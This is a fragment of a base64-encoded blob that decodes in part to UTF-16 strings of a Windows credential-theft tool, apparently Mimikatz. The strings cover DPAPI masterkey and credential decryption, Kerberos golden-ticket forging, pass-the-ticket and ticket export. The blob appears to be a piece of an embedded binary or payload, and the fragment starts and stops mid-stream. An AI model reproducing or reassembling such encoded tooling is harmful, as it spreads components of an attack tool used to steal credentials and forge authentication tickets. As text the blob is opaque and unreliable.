wAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwBtAGEAcwB0AGUAcgBrAGUAeQBfAHcAaQB0AGgAXwBwAGEAcwBzAHcAbwByAGQACgAAAAAACgBbAG0AYQBzAHQAZQByAGsAZQB5AF0AIAB3AGkAdABoACAAaABhAHMAaAA6ACAAAAAAAAAAAAAgACgAbgB0AGwAbQAgAHQAeQBwAGUAKQAKAAAAAAAAACAAKABzAGgAYQAxACAAdAB5AHAAZQApAAoAAAAAAAAAIAAoAD8AKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBtAGEAcwB0AGUAcgBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AbQBhAHMAdABlAHIAawBlAHkAXwB3AGkAdABoAF8AdQBzAGUAcgBIAGEAcwBoAAoAAAAAAAoAWwBkAG8AbQBhAGkAbgBrAGUAeQBdACAAdwBpAHQAaAAgAHYAbwBsAGEAdABpAGwAZQAgAGMAYQBjAGgAZQA6ACAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBtAGEAcwB0AGUAcgBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AZABvAG0AYQBpAG4AawBlAHkAXwB3AGkAdABoAF8AawBlAHkACgAAAAAAAABwAHYAawAAAAoAWwBkAG8AbQBhAGkAbgBrAGUAeQBdACAAdwBpAHQAaAAgAFIAUwBBACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBtAGEAcwB0AGUAcgBrAGUAeQAgADsAIABJAG4AcAB1AHQAIABtAGEAcwB0AGUAcgBrAGUAeQBzACAAZgBpAGwAZQAgAG4AZQBlAGQAZQBkACAAKAAvAGkAbgA6AGYAaQBsAGUAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBjAHIAZQBkAGgAaQBzAHQAIAA7ACAAQwBvAG4AdgBlAHIAdABTAHQAcgBpAG4AZwBTAGkAZABUAG8AUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABzAGgAYQAxAAAAAAAAAAAACgAgACAAWwBlAG4AdAByAHkAIAAlAHUAXQAgAHcAaQB0AGgAIAB2AG8AbABhAHQAaQBsAGUAIABjAGEAYwBoAGUAOgAgAAAAAAAAAAAAAAAKACAAIABbAGUAbgB0AHIAeQAgACUAdQBdACAAdwBpAHQAaAAgAFMASABBADEAIABhAG4AZAAgAFMASQBEADoAIAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AYwByAGUAZABoAGkAcwB0ACAAOwAgAEkAbgBwAHUAdAAgAGMAcgBlAGQAaABpAHMAdAAgAGYAaQBsAGUAIABuAGUAZQBkAGUAZAAgACgALwBpAG4AOgBmAGkAbABlACkACgAAAAAAAAAAAHUAbgBwAHIAbwB0AGUAYwB0AAAAAAAAACAAKgAgAHYAbwBsAGEAdABpAGwAZQAgAGMAYQBjAGgAZQA6ACAAAAAgACoAIABtAGEAcwB0AGUAcgBrAGUAeQAgACAAIAAgACAAOgAgAAAAIAA+ACAAcAByAG8AbQBwAHQAIABmAGwAYQBnAHMAIAAgADoAIAAAACAAPgAgAGUAbgB0AHIAbwBwAHkAIAAgACAAIAAgACAAIAA6ACAAAAAgAD4AIABwAGEAcwBzAHcAbwByAGQAIAAgACAAIAAgACAAOgAgACUAcwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwByAGEAdwBfAG8AcgBfAGIAbABvAGIAIAA7ACAAQwByAHkAcAB0AFUAbgBwAHIAbwB0AGUAYwB0AEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAACAAIABrAGUAeQAgADoAIAAAAAAAAAAAACAAIABzAGgAYQAxADoAIAAAAAAAAAAAACAAIABzAGkAZAAgADoAIAAAAAAAAAAAACAAIAAgAAAAIAAtAC0AIAAAAAAAAAAAACAAIAAgAD4AIABOAFQATABNADoAIAAAACAAIAAgAD4AIABTAEgAQQAxADoAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AbwBlAF8AbQBhAHMAdABlAHIAawBlAHkAXwBhAGQAZAAgADsAIABOAG8AIABHAFUASQBEACAAbwByACAASwBlAHkAIABIAGEAcwBoAD8AAAAAAEcAVQBJAEQAOgAAADsAAABLAGUAeQBIAGEAcwBoADoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGQAcABhAHAAaQBfAG8AZQBfAGMAcgBlAGQAZQBuAHQAaQBhAGwAXwBhAGQAZAAgADsAIABOAG8AIABTAEkARAA/AAAAAABTAEkARAA6ACUAcwAAAAAATQBEADQAOgAAAAAAAAAAAFMASABBADEAOgAAAAAAAABNAEQANABwADoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBvAGUAXwBkAG8AbQBhAGkAbgBrAGUAeQBfAGEAZABkACAAOwAgAE4AbwAgAEcAVQBJAEQAIABvAHIAIABLAGUAeQA/AAAAAAAAAFIAUwBBAAAATABFAEcAQQBDAFkAAAAAADsAVABZAFAARQA6ACUAcwAKAAAAAAAAAAoAQwBSAEUARABFAE4AVABJAEEATABTACAAYwBhAGMAaABlAAoAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AAoAAAAAAAAACgBNAEEAUwBUAEUAUgBLAEUAWQBTACAAYwBhAGMAaABlAAoAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAKAAAAAAAAAAAAAAAKAEQATwBNAEEASQBOAEsARQBZAFMAIABjAGEAYwBoAGUACgA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AAoAAAAAAAAAAAAAAEEAdQB0AG8AIABTAEkARAAgAGYAcgBvAG0AIABwAGEAdABoACAAcwBlAGUAbQBzACAAdABvACAAYgBlADoAIAAlAHMACgAAAEQAZQBjAHIAeQBwAHQAaQBuAGcAIABDAHIAZQBkAGUAbgB0AGkAYQBsADoACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBjAHIAZQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGQAcABhAHAAaQBfAGMAcgBlAGQAIAA7ACAASQBuAHAAdQB0ACAAQwBSAEUARAAgAGYAaQBsAGUAIABuAGUAZQBkAGUAZAAgACgALwBpAG4AOgBmAGkAbABlACkACgAAAAAAAAAAAHAAbwBsAGkAYwB5AAAAAABEAGUAYwByAHkAcAB0AGkAbgBnACAAUABvAGwAaQBjAHkAIABLAGUAeQBzADoACgAAAAAAAAAAACAAIABBAEUAUwAxADIAOAAgAGsAZQB5ADoAIAAAAAAAIAAgAEEARQBTADIANQA2ACAAawBlAHkAOgAgAAAAAAAgACAAPgAgAEEAdAB0AHIAaQBiAHUAdABlACAAJQB1ACAAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwB2AGEAdQBsAHQAIAA7ACAAQwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AdgBhAHUAbAB0ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAcABvAGwAaQBjAHkAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AdgBhAHUAbAB0ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAYwByAGUAZAApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AdgBhAHUAbAB0ACAAOwAgAEkAbgBwAHUAdAAgAEMAcgBlAGQAIABmAGkAbABlACAAbgBlAGUAZABlAGQAIAAoAC8AYwByAGUAZAA6AGYAaQBsAGUAKQAKAAAARABlAGMAcgB5AHAAdABpAG4AZwAgAEUAeABwAG8AcgB0ACAAZgBsAGEAZwBzADoACgAAAAAAAABIajFkaVE2a3BVeDdWQzRtAAAAAAAAAABEAGUAYwByAHkAcAB0AGkAbgBnACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ADoACgAAAAAAAAAAAHIAYQB3AAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBrAGUAeQBzAF8AYwBhAHAAaQAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwByAGUAYQBkAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGQAcABhAHAAaQBfAGsAZQB5AHMAXwBjAGEAcABpACAAOwAgAEkAbgBwAHUAdAAgAEMAQQBQAEkAIABwAHIAaQB2AGEAdABlACAAawBlAHkAIABmAGkAbABlACAAbgBlAGUAZABlAGQAIAAoAC8AaQBuADoAZgBpAGwAZQApAAoAAAAAAAAARABlAGMAcgB5AHAAdABpAG4AZwAgAFAAcgBpAHYAYQB0AGUAIABQAHIAbwBwAGUAcgB0AGkAZQBzADoACgAAADZqbmtkNUozWmRRRHRyc3UAAAAAAAAAAHhUNXJaVzVxVlZicnZwdUEAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AawBlAHkAcwBfAGMAbgBnACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBrAGUAeQBzAF8AYwBuAGcAIAA7ACAASQBuAHAAdQB0ACAAQwBOAEcAIABwAHIAaQB2AGEAdABlACAAawBlAHkAIABmAGkAbABlACAAbgBlAGUAZABlAGQAIAAoAC8AaQBuADoAZgBpAGwAZQApAAoAAABLZXJiZXJvcwAAAAAAAAAAcAB0AHQAAABQAGEAcwBzAC0AdABoAGUALQB0AGkAYwBrAGUAdAAgAFsATgBUACAANgBdAAAAAABsAGkAcwB0AAAAAAAAAAAATABpAHMAdAAgAHQAaQBjAGsAZQB0ACgAcwApAAAAAAB0AGcAdAAAAFIAZQB0AHIAaQBlAHYAZQAgAGMAdQByAHIAZQBuAHQAIABUAEcAVAAAAAAAAAAAAHAAdQByAGcAZQAAAAAAAABQAHUAcgBnAGUAIAB0AGkAYwBrAGUAdAAoAHMAKQAAAGcAbwBsAGQAZQBuAAAAAABXAGkAbABsAHkAIABXAG8AbgBrAGEAIABmAGEAYwB0AG8AcgB5AAAASABhAHMAaAAgAHAAYQBzAHMAdwBvAHIAZAAgAHQAbwAgAGsAZQB5AHMAAAAAAAAAcAB0AGMAAABQAGEAcwBzAC0AdABoAGUALQBjAGMAYQBjAGgAZQAgAFsATgBUADYAXQAAAAAAAABjAGwAaQBzAHQAAAAAAAAAAAAAAAAAAABMAGkAcwB0ACAAdABpAGMAawBlAHQAcwAgAGkAbgAgAE0ASQBUAC8ASABlAGkAbQBkAGEAbABsACAAYwBjAGEAYwBoAGUAAABrAGUAcgBiAGUAcgBvAHMAAAAAAAAAAABLAGUAcgBiAGUAcgBvAHMAIABwAGEAYwBrAGEAZwBlACAAbQBvAGQAdQBsAGUAAAAlADMAdQAgAC0AIABEAGkAcgBlAGMAdABvAHIAeQAgACcAJQBzACcAIAAoACoALgBrAGkAcgBiAGkAKQAKAAAAXAAqAC4AawBpAHIAYgBpAAAAAABcAAAAIAAgACAAJQAzAHUAIAAtACAARgBpAGwAZQAgACcAJQBzACcAIAA6ACAAAAAAAAAAJQAzAHUAIAAtACAARgBpAGwAZQAgACcAJQBzACcAIAA6ACAAAAAAAE8ASwAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0AF8AZgBpAGwAZQAgADsAIABMAHMAYQBDAGEAbABsAEsAZQByAGIAZQByAG8AcwBQAGEAYwBrAGEAZwBlACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAXwBmAGkAbABlACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdABfAGQAYQB0AGEAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUwB1AGIAbQBpAHQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAXwBkAGEAdABhACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAFQAaQBjAGsAZQB0ACgAcwApACAAcAB1AHIAZwBlACAAZgBvAHIAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAgAGkAcwAgAE8ASwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB1AHIAZwBlACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFAAdQByAGcAZQBUAGkAYwBrAGUAdABDAGEAYwBoAGUATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHUAcgBnAGUAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUAB1AHIAZwBlAFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAASwBlAHIAYgBlAHIAbwBzACAAVABHAFQAIABvAGYAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAgADoAIAAAAAAAAAAAAAAAAAAKAAoACQAqACoAIABTAGUAcwBzAGkAbwBuACAAawBlAHkAIABpAHMAIABOAFUATABMACEAIABJAHQAIABtAGUAYQBuAHMAIABhAGwAbABvAHcAdABnAHQAcwBlAHMAcwBpAG8AbgBrAGUAeQAgAGkAcwAgAG4AbwB0ACAAcwBlAHQAIAB0AG8AIAAxACAAKgAqAAoAAAAAAG4AbwAgAHQAaQBjAGsAZQB0ACAAIQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHQAZwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAGUAeABwAG8AcgB0AAAAAAAKAFsAJQAwADgAeABdACAALQAgADAAeAAlADAAOAB4ACAALQAgACUAcwAAAAAAAAAKACAAIAAgAFMAdABhAHIAdAAvAEUAbgBkAC8ATQBhAHgAUgBlAG4AZQB3ADoAIAAAAAAAAAAAACAAOwAgAAAAAAAAAAAAAAAKACAAIAAgAFMAZQByAHYAZQByACAATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAgAEAAIAAlAHcAWgAAAAAAAAAAAAAAAAAAAAoAIAAgACAAQwBsAGkAZQBuAHQAIABOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAdwBaACAAQAAgACUAdwBaAAAAAAAAAAoAIAAgACAARgBsAGEAZwBzACAAJQAwADgAeAAgACAAIAAgADoAIAAAAAAAAAAAAGsAaQByAGIAaQAAAAAAAAAKACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAIAAgACAAIAA6ACAAJQBzAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUARQBuAGMAbwBkAGUAZABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUQB1AGUAcgB5AFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBFAHgAMgBNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBRAHUAZQByAHkAVABpAGMAawBlAHQAQwBhAGMAaABlAEUAeAAyAE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAJQB1AC0AJQAwADgAeAAtACUAdwBaAEAAJQB3AFoALQAlAHcAWgAuACUAcwAAAAAAdABpAGMAawBlAHQALgBrAGkAcgBiAGkAAAAAAAAAAAB0AGkAYwBrAGUAdAAAAAAAYQBkAG0AaQBuAAAAAAAAAHUAcwBlAHIAAAAAAAAAAABkAG8AbQBhAGkAbgAAAAAAZABlAHMAAAByAGMANAAAAGsAcgBiAHQAZwB0AAAAAABhAGUAcwAxADIAOAAAAAAAYQBlAHMAMgA1ADYAAAAAAHMAZQByAHYAaQBjAGUAAAB0AGEAcgBnAGUAdAAAAAAAaQBkAAAAAAByAG8AZABjAAAAAAAAAAAAZwByAG8AdQBwAHMAAAAAAHMAaQBkAHMAAAAAADAAAABzAHQAYQByAHQAbwBmAGYAcwBlAHQAAAA1ADIANQA2ADAAMAAwAAAAZQBuAGQAaQBuAAAAAAAAAHIAZQBuAGUAdwBtAGEAeAAAAAAAAAAAAFUAcwBlAHIAIAAgACAAIAAgACAAOgAgACUAcwAKAEQAbwBtAGEAaQBuACAAIAAgACAAOgAgACUAcwAKAFMASQBEACAAIAAgACAAIAAgACAAOgAgACUAcwAKAFUAcwBlAHIAIABJAGQAIAAgACAAOgAgACUAdQAKAAAAAAAAAAAARwByAG8AdQBwAHMAIABJAGQAIAA6ACAAKgAAAAAAAAAlAHUAIAAAAAoARQB4AHQAcgBhACAAUwBJAEQAcwA6ACAAAAAAAAAACgBTAGUAcgB2AGkAYwBlAEsAZQB5ADoAIAAAAAAAAAAgAC0AIAAlAHMACgAAAAAAUwBlAHIAdgBpAGMAZQAgACAAIAA6ACAAJQBzAAoAAABUAGEAcgBnAGUAdAAgACAAIAAgADoAIAAlAHMACgAAAEwAaQBmAGUAdABpAG0AZQAgACAAOgAgAAAAAAAAAAAAKgAqACAAUABhAHMAcwAgAFQAaABlACAAVABpAGMAawBlAHQAIAAqACoAAAAAAAAALQA+ACAAVABpAGMAawBlAHQAIAA6ACAAJQBzAAoACgAAAAAAAAAAAAoARwBvAGwAZABlAG4AIAB0AGkAYwBrAGUAdAAgAGYAbwByACAAJwAlAHMAIABAACAAJQBzACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHMAdQBiAG0AaQB0AHQAZQBkACAAZgBvAHIAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAKAAAAAAAAAAAACgBGAGkAbgBhAGwAIABUAGkAYwBrAGUAdAAgAFMAYQB2AGUAZAAgAHQAbwAgAGYAaQBsAGUAIAAhAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIAAKAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAEMAcgBlAGQAIABlAHIAcgBvAHIACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAHQAZwB0ACAAawBlAHkAIABzAGkAegBlACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAJQB1ACAAKAAlAHUAIABiAHkAdABlAHMAKQAgAGYAbwByACAAJQBzAAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYwBhAHQAZQAgAEMAcgB5AHAAdABvAFMAeQBzAHQAZQBtACAAZgBvAHIAIABFAFQAWQBQAEUAIAAlAHUAIAAoAGUAcgByAG8AcgAgADAAeAAlADAAOAB4ACkAIAAtACAAQQBFAFMAIABvAG4AbAB5ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABvAG4AIABOAFQANgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGsAcgBiAHQAZwB0ACAAawBlAHkAIABhAHIAZwB1AG0AZQBuAHQAIAAoAC8AcgBjADQAIABvAHIAIAAvAGEAZQBzADEAMgA4ACAAbwByACAALwBhAGUAcwAyADUANgApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAAUwBJAEQAIABzAGUAZQBtAHMAIABpAG4AdgBhAGwAaQBkACAALQAgAEMAbwBuAHYAZQByAHQAUwB0AHIAaQBuAGcAUwBpAGQAVABvAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAUwBJAEQAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGQAbwBtAGEAaQBuACAAYQByAGcAdQBtAGUAbgB0AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIAB1AHMAZQByACAAYQByAGcAdQBtAGUAbgB0AAoAAAAAAAAAPAAzACAAZQBvAC4AbwBlACAAfgAgAEEATgBTAFMASQAgAEUAPgAAACAAKgAgAFAAQQBDACAAZwBlAG4AZQByAGEAdABlAGQACgAAAAAAAAAgACoAIABQAEEAQwAgAHMAaQBnAG4AZQBkAAoAAAAAACAAKgAgAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAIAAqACAARQBuAGMAVABpAGMAawBlAHQAUABhAHIAdAAgAGUAbgBjAHIAeQBwAHQAZQBkAAoAAAAgACoAIABLAHIAYgBDAHIAZQBkACAAZwBlAG4AZQByAGEAdABlAGQACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuAF8AZABhAHQAYQAgADsAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgBjAHIAeQBwAHQAIAAlADAAOAB4AAoAAAAAAAAACQAqACAAJQBzACAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBoAGEAcwBoAF8AZABhAHQAYQAgADsAIABIAGEAcwBoAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAlADAAOAB4AAoAAAAAAGMAbwB1AG4AdAAAAAAAAABYAC0AQwBBAEMASABFAEMATwBOAEYAOgAAAAAAAAAAAAoAUAByAGkAbgBjAGkAcABhAGwAIAA6ACAAAAAAAAAACgAKAEQAYQB0AGEAIAAlAHUAAAAAAAAACgAJACAAIAAgACoAIABJAG4AagBlAGMAdABpAG4AZwAgAHQAaQBjAGsAZQB0ACAAOgAgAAAAAAAKAAkAIAAgACAAKgAgAFMAYQB2AGUAZAAgAHQAbwAgAGYAaQBsAGUAIAAlAHMAIAAhAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGMAYQBjAGgAZQBfAGUAbgB1AG0AIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAoACQAqACAAJQB3AFoAIABlAG4AdAByAHkAPwAgACoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGMAYwBhAGMAaABlAF8AZQBuAHUAbQAgADsAIABjAGMAYQBjAGgAZQAgAHYAZQByAHMAaQBvAG4AIAAhAD0AIAAwAHgAMAA1ADAANAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AYwBjAGEAYwBoAGUAXwBlAG4AdQBtACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8